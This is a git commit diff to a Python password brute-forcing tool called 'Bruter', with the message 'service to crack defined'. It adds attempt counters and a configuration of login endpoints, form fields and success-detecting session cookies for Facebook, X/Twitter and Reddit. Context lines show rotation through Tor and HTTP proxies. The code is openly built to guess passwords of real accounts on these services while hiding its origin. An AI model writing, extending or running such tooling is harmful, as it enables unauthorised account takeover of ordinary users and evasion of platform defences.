bb6cdd44d39300fbce40b91613a97d8c723b7cb4
elijah <cuiyeqing960904@gmail.com>
2025-07-02 00:22:53 +0300

    service to crack defined

--- password/main.py
+++ password/main.py
@@ -1,4 +1,5 @@
 from proxyscrape import create_collector, get_collector
+import time
 
 avoidance_patterns = [
     r"^[0-9]+$",  # Avoid using all numeric passwords
@@ -16,6 +17,8 @@ proxies = [
 class Bruter:
     def __init__(self, verbose=False):
         self.verbose = verbose
+        self.start_time = time.time()
+        self.attempts = 0
         self.proxies = [
             "socks5://127.0.0.1:9050",  # TOR
             "http://127.0.0.1:8080",    # HTTP
@@ -30,3 +33,21 @@ class Bruter:
             if self.verbose:
                 print(f"[Warning] Error loading proxies: {str(e)}")
             print("[*] Using default proxy configuration")
+
+        self.service_configs = {
+            'facebook': {
+                'url': 'https://www.facebook.com/login',
+                'data': lambda u, p: {'email': u, 'pass': p},
+                'success': lambda r: 'c_user' in r.cookies
+            },
+            'twitter': {
+                'url': 'https://x.com/i/flow/login',
+                'data': lambda u, p: {'username': u, 'password': p},
+                'success': lambda r: 'auth_token' in r.cookies
+            },
+            'reddit': {
+                'url': 'https://www.reddit.com/login',
+                'data': lambda u, p: {'user': u, 'passwd': p},
+                'success': lambda r: 'reddit_session' in r.cookies
+            }
+        }
